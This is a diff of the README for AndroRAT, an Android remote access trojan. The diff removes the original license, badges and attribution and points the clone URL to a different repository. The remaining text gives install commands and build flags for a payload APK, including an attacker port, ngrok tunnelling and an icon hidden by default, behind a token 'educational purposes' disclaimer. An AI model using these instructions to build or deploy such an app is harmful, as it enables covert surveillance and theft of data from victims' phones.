@@ -1,10 +1,6 @@
 **Disclaimer** : This software is meant for educational purposes only. I'm not responsible for any malicious use of the app.
 # AndroRAT 
 
-[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT) 
-[![Twitter Follow](https://img.shields.io/twitter/follow/karma9874?label=Follow&style=social)](https://twitter.com/karma9874)
-[![GitHub followers](https://img.shields.io/github/followers/karma9874?label=Follow&style=social)](https://github.com/karma9874)
-
 AndroRAT is a tool designed to give the control of the android system remotely and retrieve informations from it. Androrat is a client/server application developed in Java Android for the client side and the Server is in Python.
 
 ##### AndroRAT will work on device from Android 4.1 (Jelly Bean) to Android 9.0 (Oreo) (API 16 to API 28)
@@ -30,7 +26,7 @@ AndroRAT requires Python3 and JAVA (or Android Studio)
 
 ## Installation
 ```
-git clone https://github.com/karma9874/AndroRAT.git
+git clone https://github.com/GoradiaNishant/androRAT.git
 cd AndroRAT
 pip install -r requirements.txt
 ```
@@ -63,7 +59,7 @@ Usage:
   python3 androRAT.py --build --ngrok [flags]
   Flags:
     -p, --port              Attacker port number (optional by default its set to 8000)
-    -o, --output            Name for the apk file (optional by default its set to "karma.apk")
+    -o, --output            Name for the apk file (optional by default its set to "apk release.apk")
     -icon, --icon           Visible icon after installing apk (by default set to hidden)
 ```
 
@@ -138,18 +134,5 @@ In the sh shell there are some sub commands
   <img src="Screenshots/1.JPG" width="800"/>
 </p>
 ------------------------------------------------------------------------------------------------------------------------------
-
-## Supporters:
-[![rayep](https://avatars.githubusercontent.com/u/40718616?v=4&s=60)](https://github.com/rayep)
-
-## TODO
-* ~~Ngrok support~~
-* Set up multi client
-* Add screenshot command
-
-
-## License
-AndroRAT is licensed under MIT license take a look at the [LICENSE](LICENSE) for more information.
-
 
 # androRat
